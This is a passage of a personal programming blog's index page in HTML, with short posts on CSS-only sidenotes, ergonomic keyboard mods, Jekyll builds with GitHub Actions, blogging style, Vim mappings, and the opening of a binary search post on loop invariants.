      <p>To mathematicians, this means that the probability tends towards 1 as the size of the tree goes to infinity. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p>Await a possible future post where I talk extensively about interesting things you can do with monoids. <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/inline-notes">Inline sidenotes</a></h2>
  
    <div class="bounded"><p>I found a nice way to make inline sidenotes from <a href="https://www.gwern.net/Sidenotes">Sidenotes in Web Design (Gwern)</a>. And sorry to RSS feed users who have little to no idea what’s going on.</p>

<!--more-->

<p>Here is a demonstration of these: <sup class="note"><span>Hello from note!</span></sup>. As you can see, they don’t break the paragraph <em>at</em> the note position, but allow text to continue until the end of the line<sup class="note"><span>As you can see, these <em>just work</em></span></sup><sup class="note"><span>And they number themselves automatically!</span></sup>. This required no Javascript – only CSS! The HTML code for a single note is</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;sup</span> <span class="na">class=</span><span class="s">"note"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;span&gt;</span>And they number themselves automatically!<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/sup&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>and the CSS is just this:</p>

<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="nt">article</span> <span class="p">{</span>
	<span class="nl">counter-reset</span><span class="p">:</span> <span class="n">note_nr</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">sup</span><span class="nc">.note</span><span class="nd">::before</span> <span class="p">{</span>
	<span class="nl">counter-increment</span><span class="p">:</span> <span class="n">note_nr</span><span class="p">;</span>
	<span class="nl">content</span><span class="p">:</span> <span class="n">counter</span><span class="p">(</span><span class="n">note_nr</span><span class="p">);</span>
<span class="p">}</span>
<span class="nt">sup</span><span class="nc">.note</span> <span class="o">&gt;</span> <span class="nt">span</span> <span class="p">{</span>
	<span class="nl">display</span><span class="p">:</span> <span class="nb">block</span><span class="p">;</span>
	<span class="nl">float</span><span class="p">:</span> <span class="nb">left</span><span class="p">;</span>
	<span class="nl">clear</span><span class="p">:</span> <span class="nb">both</span><span class="p">;</span>
	<span class="nl">width</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
	<span class="nl">padding</span><span class="p">:</span> <span class="m">0</span> <span class="m">2rem</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">sup</span><span class="nc">.note</span> <span class="o">&gt;</span> <span class="nt">span</span><span class="nd">::before</span> <span class="p">{</span>
	<span class="nl">content</span><span class="p">:</span> <span class="n">counter</span><span class="p">(</span><span class="n">note_nr</span><span class="p">)</span> <span class="s1">" "</span><span class="p">;</span>
	<span class="nl">vertical-align</span><span class="p">:</span> <span class="nb">super</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Unfortunately, I haven’t figured out how to make Jekyll &amp; Kramdown generate footnotes in this style<sup class="note"><span>You could do it with custom Liquid tags/filters, but those aren’t as nice as kramdown’s footnote syntax</span></sup>, so bottom-of-page footnotes will be staying until I do.</p>

<style>
article {
	counter-reset: note_nr;
}
sup.note::before {
	counter-increment: note_nr;
	content: counter(note_nr);
}
sup.note > span {
	display: block;
	float: left;
	clear: both;
	width: 100%;
	padding: 0 2rem;
}
sup.note > span::before {
	content: counter(note_nr) " ";
	vertical-align: super;
}
</style>

</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/keyboard">Wacky Keyboard Mods</a></h2>
  
    <div class="bounded"><p>For the past year or so, I’ve been using a <abbr title="Two separate halves">split</abbr> <abbr title="The keys are in a grid shape.">ortholinear</abbr> keyboard known as the Nyquist<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>. Its nonstandard design and the abundance of keys on the bottom row has led me to throw out many keyboard conventions, making something that is far more comfortable.</p>

<!--more-->

<p><img src="/assets/nyquist.jpg" alt="My keyboard" /></p>

<p><em>My keyboard.</em></p>

<h2 id="caps--esc"><a href="#caps--esc">Caps → Esc</a></h2>

<p>Firstly, a less esoteric change. The capslock key is useless so let’s replace it with something useful – I’m a Vim user so I made it <kbd>Esc</kbd>, but <kbd>Ctrl</kbd> is a popular alternative.</p>

<h2 id="palm-keys"><a href="#palm-keys">Palm Keys</a></h2>

<p><img src="/assets/palm-key.jpg" alt="Wooden Palm Keys" /></p>

<p><em>Wooden palm keys. Source: <a href="http://ergoemacs.org/emacs/emacs_pinky.html">xahlee</a>, who got it from <a href="https://www.reddit.com/r/emacs/comments/7zvw2b/my_weapon_against_emacs_pinky/">reddit</a></em></p>

<p>Palm Keys (see <a href="https://superuser.com/a/317593">https://superuser.com/a/317593</a>) is the idea of pressing <kbd>Ctrl</kbd> with the side of your palm – essentially the base of your pinky – to avoid the strain on your pinky &amp; awkward hand twists for some key combos (e.g. <kbd>Ctrl</kbd>+<kbd>Q</kbd>).</p>

<p>I can’t praise this enough – it’s incredibly simple (I originally used Lego &amp; blu-tack) and the benefits are immense. I started using this mod around 1½ years ago, back when I still used a full-sized keyboard, and I’ve been using it ever since.</p>

<h2 id="thumb-keys"><a href="#thumb-keys">Thumb Keys</a></h2>

<p>Another mod that moves work away from the usual 4+4 fingers is to use your thumbs. This is something that can only be fully exploited in custom keyboards – see <a href="reddit.com/r/ergomechkeyboards">/r/ergomechkeyboards</a> – since standard keyboards have a <em>massive</em> spacebar<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup> that limits which keys can be even pressed by your thumbs.</p>

<p><img src="/assets/keyboard-layout.png" alt="My bottom row" /></p>

<p><em>My bottom row. Made with <a href="http://www.keyboard-layout-editor.com/">keyboard-layout-editor.com</a></em></p>

<p>But, when done well, it’s <em>extremely</em> comfortable. You’ll essentially always have your fingers on the home row. YOU CAN ALSO TYPE SENTENCES IN UPPERCASE WITHOUT CAPSLOCK WITH EASE.</p>

<p>If you’re stuck with a standard keyboard, you can get some of the benefit by rebinding right <kbd>Alt</kbd> to something more commonly used (shift, for example).</p>

<h2 id="conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>Some of these changes are quite common on <a href="reddit.com/r/ergomechkeyboards">/r/ergomechkeyboards</a>, so definitely go there if you’d like to see more of this, and <a href="http://xahlee.info/kbd/keyboard_blog.html">Xah’s Keyboard Blog</a> is a treasure trove of similar keyboard mods.</p>

<p>In addition to these key mods, there’s also the benefit of having a <abbr title="Two separate halves">split</abbr> keyboard – being able to move the halves apart, and being able to tilt the keyboard – both of which are quite nice. There are even further improvement possible if you abandon qwerty, but that’s too much of a muscle-memory-breaking change for me. These changes are things that, once you try them, reveal just how far from optimal regular keyboards are. Though they do make it harder to use a keyboard with only a single hand, like when you’re eating.</p>

<p>And, if you’re trying to avoid RSI, try (fingerless) gloves – my hands become sore sooner if they’re cold. Also try using your mouse with your left hand.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>You can see photos of this kind of keyboard <a href="http://xahlee.info/kbd/nyquist_keyboard.html">here</a>. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>I can’t believe wide spacebars are standard. It’s such a waste of prime keyboard real estate. Most people only use at most 2 key widths of it. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/blog-ci">Blog CI</a></h2>
  
    <div class="bounded"><p>While I’ve tried to keep this blog as static as possible, I’ve struggled with the limitations of github-pages for many features that I wanted to use.</p>

<!--more-->

<ul>
  <li>Biggest of all, you can’t render <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LaTeX</mtext></mrow><annotation encoding="application/x-tex">\LaTeX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89883em;vertical-align:-0.2155em;"></span><span class="mord text"><span class="mord textrm">L</span><span class="mspace" style="margin-right:-0.36em;"></span><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.904999em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord"><span class="mord textrm mtight sizing reset-size6 size3">A</span></span></span></span></span></span><span class="mspace" style="margin-right:-0.15em;"></span><span class="mord text"><span class="mord textrm">T</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.46782999999999997em;"><span style="top:-2.7845em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord textrm">E</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.2155em;"><span></span></span></span></span><span class="mspace" style="margin-right:-0.125em;"></span><span class="mord textrm">X</span></span></span></span></span></span> in jekyll and must include KaTeX or MathJax to render it client-side.</li>
  <li>Turning sections headings into links requires either doing it client-side or <a href="https://github.com/allejo/jekyll-anchor-headings">parsing html with the Liquid templating system</a>.</li>
  <li>Including GraphViz graphs (or other rendered diagrams) requires either generating them by hand, or automating it using a Makefile. Either way, you need to re-render the graphics by hand when you make changes.</li>
</ul>

<p>Switching to github actions to build significantly relaxes these constraints. <a href="https://github.com/ralismark/ralismark.github.io/blob/d3ece19d62ed269817d3fcd397886e7f7c137547/.github/workflows/deploy.yml">My current setup</a> involves spinning up a docker container and building the site there – so I can test locally – then automatically pushing to the <code class="language-plaintext highlighter-rouge">gh-pages</code> branch. It still uses Jekyll as the static site generator, so migration was quite painless.</p>

<p>With the full power of Jekyll, you can render <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LaTeX</mtext></mrow><annotation encoding="application/x-tex">\LaTeX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89883em;vertical-align:-0.2155em;"></span><span class="mord text"><span class="mord textrm">L</span><span class="mspace" style="margin-right:-0.36em;"></span><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.904999em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord"><span class="mord textrm mtight sizing reset-size6 size3">A</span></span></span></span></span></span><span class="mspace" style="margin-right:-0.15em;"></span><span class="mord text"><span class="mord textrm">T</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.46782999999999997em;"><span style="top:-2.7845em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord textrm">E</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.2155em;"><span></span></span></span></span><span class="mspace" style="margin-right:-0.125em;"></span><span class="mord textrm">X</span></span></span></span></span></span> server-side by switching kramdown’s math engine to <a href="https://github.com/kramdown/math-sskatex">sskatex</a>. You can also write plugins in the <code class="language-plaintext highlighter-rouge">_plugins</code> folder e.g. to <a href="https://github.com/ralismark/ralismark.github.io/blob/d3ece19d62ed269817d3fcd397886e7f7c137547/_plugins/graphviz.rb">run graphviz</a> or <a href="https://github.com/ralismark/ralismark.github.io/blob/d3ece19d62ed269817d3fcd397886e7f7c137547/_plugins/markdown-header.rb">add anchor tags to headers</a> – check Jekyll’s docs for more.</p>

</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/blog-style">Blog Post Style</a></h2>
  
    <div class="bounded"><p>I’ve been reading a lot of blogs (and similar content) recently, many of which are part of <a href="https://100daystooffload.com/">#100DaysToOffload</a>. And it’s got me thinking about my own post style.</p>

<!--more-->

<p>Most of the stuff on my blog is longer technical content. Excluding the interactive posts, which aren’t really blog posts at all, most of my recent posts are about explaining computer science / competitive programming techniques, and all pretty long posts.</p>

<p>A lot of stuff I’ve seen on <a href="https://100daystooffload.com/">#100DaysToOffload</a> is shorter, less polished content, which I might try to aim for now. And hopefully have some variety in what I cover. I’ve got a few more work-in-progress technical posts, but those are less focused on competitive programming specifically.</p>

<p>I’ve also been reading people’s posts on <a href="https://www.lesswrong.com/">https://www.lesswrong.com/</a>. Some of the more well-known and longer posts by Eliezer are quite meandering, and many don’t have a clear theme running throughout the article, or could be expressed in fewer words. I guess that’s one downside of longer articles. The core ideas are good though, so I might make a post summarising them, if that hasn’t been done yet.</p>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/how-i-use-vim-1">How I Use Vim (part 1)</a></h2>
  
    <div class="bounded"><p>I’ve been using Vim (well, Neovim) for several years now and I’ve developed some idiosyncrasies along the way. <a href="https://github.com/ralismark/vimfiles">My vimrc</a> is quite large, so here’s a few points.</p>

<!--more-->

<blockquote>
  <p>Note: This not intended as a guide on how to learn or use Vim – it’s how <em>I</em> use Vim, not how you should use Vim. This is a sample of the things I do and use.</p>

  <p>Nor is this written with absolute beginners in mind. If you’re just starting, take time to learn Vim fundamentals before diving into extensive customisation.</p>
</blockquote>

<h2 id="core-vim"><a href="#core-vim">Core Vim</a></h2>

<p>Like all Vim users, I use <code class="language-plaintext highlighter-rouge">hjkl</code> to navigate. However, one thing you might see in Vim tutorials that I <em>don’t</em> use are numbers with these keys – <code class="language-plaintext highlighter-rouge">5j</code> to go down 5 lines, for example. I had <a href="https://vimhelp.org/options.txt.html#%27relativenumber%27"><code class="language-plaintext highlighter-rouge">'relativenumber'</code></a> set for several years, but it never felt intuitive. This extends to operator-pending mode too – I heavily rely on <a href="https://vimhelp.org/visual.txt.html#linewise-visual">visual line</a>/<a href="https://vimhelp.org/visual.txt.html#blockwise-visual">block</a> mode to do multiline operations. For example, to delete multiple lines, I would do <code class="language-plaintext highlighter-rouge">Vjjjjd</code> instead of <code class="language-plaintext highlighter-rouge">d4j</code>.</p>

<p>Furthermore, for plain navigation I often use uppercase <a href="https://vimhelp.org/motion.txt.html#W"><code class="language-plaintext highlighter-rouge">W</code></a> and <a href="https://vimhelp.org/motion.txt.html#B"><code class="language-plaintext highlighter-rouge">B</code></a> to move left and right. I also use <code class="language-plaintext highlighter-rouge">0w</code> instead of <code class="language-plaintext highlighter-rouge">^</code>, which is harder to type, to move to the start of line. I haven’t figured out a good way of navigating vertically yet, so I’m still on h/j plus fast keyrepeat.</p>

<h2 id="leader-mapping"><a href="#leader-mapping">Leader Mapping</a></h2>

<p>I have <a href="https://vimhelp.org/map.txt.html#%3CLeader%3E"><code class="language-plaintext highlighter-rouge">&lt;leader&gt;</code></a> mapped to <code class="language-plaintext highlighter-rouge">&lt;space&gt;</code>. Here’s some of my bindings for inspiration:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;w</code> to save (<a href="https://vimhelp.org/editing.txt.html#:update"><code class="language-plaintext highlighter-rouge">:update</code></a>), which I use <em>very</em> often</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;q</code> to close buffer with <code class="language-plaintext highlighter-rouge">:q</code></li>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;o&lt;key&gt;</code> to toggle various options, such as <a href="https://vimhelp.org/options.txt.html#%27wrap%27">(w)rap</a>, <a href="https://vimhelp.org/options.txt.html#%27diff%27">(d)iff</a>, <a href="https://vimhelp.org/options.txt.html#%27spell%27">(s)pellchecking</a></li>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;m</code> to make using <a href="https://github.com/tpope/vim-dispatch">tpope/vim-dispatch</a></li>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;x</code> to “run” the current file (<code class="language-plaintext highlighter-rouge">ExecCurrent()</code> in my vimrc).</li>
</ul>

<h2 id="splits--tabs"><a href="#splits--tabs">Splits &amp; Tabs</a></h2>

<p>I have a lot of bindings set up to make splits and tabs easier to use. This includes:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;s&lt;key&gt;</code> to open empty splits in different directions with <a href="https://vimhelp.org/windows.txt.html#:new"><code class="language-plaintext highlighter-rouge">:new</code></a> and <a href="https://vimhelp.org/windows.txt.html#:aboveleft"><code class="language-plaintext highlighter-rouge">:aboveleft</code></a>/<a href="https://vimhelp.org/windows.txt.html#:belowright"><code class="language-plaintext highlighter-rouge">:belowright</code></a>/<a href="https://vimhelp.org/windows.txt.html#:vertical"><code class="language-plaintext highlighter-rouge">:vertical</code></a>.</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;c-hjkl&gt;</code> to move between splits</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;leader&gt;t</code> to open a new tab</li>
  <li><code class="language-plaintext highlighter-rouge">[t</code> and <code class="language-plaintext highlighter-rouge">]t</code> to move between tabs</li>
</ul>

<p>When I started using Vim, I often encountered articles about how “people are using tabs wrong” and how buffers are the way you’re meant to use Vim e.g. <a href="https://stackoverflow.com/a/103590/6936976">this</a>. However, having hidden buffers (<a href="https://vimhelp.org/options.txt.html#%27hidden%27"><code class="language-plaintext highlighter-rouge">'hidden'</code></a>) didn’t feel right and I kept forgetting which I had open, so this was the setup I eventually settled into.</p>

<h2 id="less-surprising-behaviour"><a href="#less-surprising-behaviour">Less surprising behaviour</a></h2>

<p>I’ve got quite a few mappings that make movement and operations behave “as you would expect”, or just generally more useful. Firstly, for wrapping:</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nb">noremap</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> G &amp;<span class="nb">wrap</span> ? <span class="s2">"G$g0"</span> <span class="p">:</span> <span class="s2">"G"</span>
<span class="nb">noremap</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> <span class="m">0</span> &amp;<span class="nb">wrap</span> ? <span class="s1">'g0'</span> <span class="p">:</span> <span class="s1">'0'</span>
<span class="nb">noremap</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> $ &amp;<span class="nb">wrap</span> ? <span class="s2">"g$"</span> <span class="p">:</span> <span class="s2">"$"</span>
<span class="nb">noremap</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> <span class="k">j</span> <span class="p">(</span><span class="k">v</span><span class="p">:</span><span class="nb">count</span> <span class="p">==</span> <span class="m">0</span> ? <span class="s1">'gj'</span> <span class="p">:</span> <span class="s1">'j'</span><span class="p">)</span>
<span class="nb">noremap</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> <span class="k">k</span> <span class="p">(</span><span class="k">v</span><span class="p">:</span><span class="nb">count</span> <span class="p">==</span> <span class="m">0</span> ? <span class="s1">'gk'</span> <span class="p">:</span> <span class="s1">'k'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And a few for visual mode:</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c">" Fixed I/A for visual</span>
xnoremap <span class="p">&lt;</span>expr<span class="p">&gt;</span> I <span class="k">mode</span><span class="p">()</span> <span class="p">==</span># <span class="s1">'v'</span> ? <span class="s2">"\&lt;c-v&gt;I"</span> <span class="p">:</span> <span class="k">mode</span><span class="p">()</span> <span class="p">==</span># <span class="s1">'V'</span> ? <span class="s2">"\&lt;c-v&gt;^o^I"</span> <span class="p">:</span> <span class="s2">"I"</span>
xnoremap <span class="p">&lt;</span>expr<span class="p">&gt;</span> A <span class="k">mode</span><span class="p">()</span> <span class="p">==</span># <span class="s1">'v'</span> ? <span class="s2">"\&lt;c-v&gt;A"</span> <span class="p">:</span> <span class="k">mode</span><span class="p">()</span> <span class="p">==</span># <span class="s1">'V'</span> ? <span class="s2">"\&lt;c-v&gt;Oo$A"</span> <span class="p">:</span> <span class="s2">"A"</span>
<span class="c">" Keep selection</span>
xnoremap <span class="p">&lt;</span> <span class="p">&lt;</span>gv
xnoremap <span class="p">&gt;</span> <span class="p">&gt;</span>gv
<span class="c">" Paste without overwriting default register (doesn't work with other registers)</span>
xnoremap <span class="k">p</span> pgvy
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And a bunch that don’t really fit the above two groups:</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c">" Yank to end of line</span>
nnoremap Y <span class="k">y</span>$
<span class="c">" Escape as normal</span>
<span class="k">tnoremap</span> <span class="p">&lt;</span>esc<span class="p">&gt;</span> <span class="p">&lt;</span><span class="k">c</span><span class="p">-</span>\<span class="p">&gt;&lt;</span><span class="k">c</span><span class="p">-</span><span class="k">n</span><span class="p">&gt;</span>
<span class="c">" go to correct column</span>
<span class="nb">noremap</span> ' `
<span class="c">" Don't copy single letter deletes</span>
nnoremap <span class="k">x</span> "_x
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="a-grab-bag-of-mappings"><a href="#a-grab-bag-of-mappings">A grab bag of mappings</a></h2>

<p>Finally, here’s a collection of miscellaneous mappings that I use often</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nb">noremap</span> ; <span class="p">:</span>
<span class="c">" Folding</span>
nnoremap <span class="p">&lt;</span><span class="k">tab</span><span class="p">&gt;</span> za
<span class="c">" Clear search highlight</span>
nnoremap <span class="p">&lt;</span><span class="k">silent</span><span class="p">&gt;</span> <span class="p">&lt;</span>esc<span class="p">&gt;</span> <span class="p">&lt;</span>cmd<span class="p">&gt;</span>nohl<span class="p">&lt;</span><span class="k">cr</span><span class="p">&gt;</span>
<span class="c">" for f/F/t/T</span>
<span class="nb">noremap</span> <span class="p">,</span> ;
<span class="c">" &lt;cr&gt; mutlitool: follow link in man/help/quickfix, otherwise run recorded macro</span>
<span class="nb">map</span> <span class="p">&lt;</span>expr<span class="p">&gt;</span> <span class="p">&lt;</span><span class="k">return</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">or</span><span class="p">(</span>&amp;<span class="nb">buftype</span> <span class="p">==</span> <span class="s1">'help'</span><span class="p">,</span> <span class="nb">expand</span><span class="p">(</span><span class="s2">"%:p"</span><span class="p">)</span> <span class="p">=~</span> <span class="s1">'^man://'</span><span class="p">))</span> ? <span class="s2">"\&lt;c-]&gt;"</span> <span class="p">:</span> <span class="p">(</span>&amp;<span class="nb">buftype</span> <span class="p">==</span> <span class="s1">'quickfix'</span> ? <span class="s2">"\&lt;CR&gt;"</span> <span class="p">:</span> <span class="s2">"@q"</span><span class="p">)</span>
<span class="c">" non-saving delete</span>
<span class="nb">noremap</span> X "_d
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>This is the more “core” part of my Vim usage. I plan on going into my many plugins in part 2 (whenever I get around to it).</p>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/binary-search">You don't know binary search</a></h2>
  
    <div class="bounded"><p>Binary search is a very fundamental algorithm, but it’s also quite a finicky one. It’s easy to introduce bugs, especially when dealing with more complex criteria. One of the first things that students learn at the AIOC December camp is how to think about binary search in a way such that you’ll never write it wrong ever again. This post is more or less a written version of that.</p>

<!--more-->

<blockquote>
  <p>“<em>Although the basic idea of binary search is comparatively straightforward, the details can be surprisingly tricky</em>”</p>

  <p>—Donald Knuth</p>
</blockquote>

<p>But before we actually get into binary search, you have to learn about loop invariants first.</p>

<h2 id="invariants"><a href="#invariants">Invariants</a></h2>

<p>Broadly, invariants are guarantees about your code. For example, that one variable is always less than another.</p>

<p><strong>Loop invariants</strong> are a common kind: these are conditions that are always true between every iteration of a loop. These define what assumptions you can make, but also what conditions you need to satisfy. Here’s an example:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">// Determine the greatest value in an array</span>
<span class="kt">int</span> <span class="nf">max</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">int</span><span class="o">*</span> <span class="n">vals</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">most</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">most</span><span class="p">)</span> <span class="n">most</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">most</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The invariant here is that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">most</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span></span></span></span> is the greatest value in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..</mn><mi>i</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">vals[0 .. i-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>.</p>

<p>Firstly, the invariant is before the loop is run – the maximum of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0..0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">vals[0..0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">.</span><span class="mord">.</span><span class="mord">0</span><span class="mclose">]</span></span></span></span> is simply the only element it contains, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">vals[0]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">s</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>.</p>

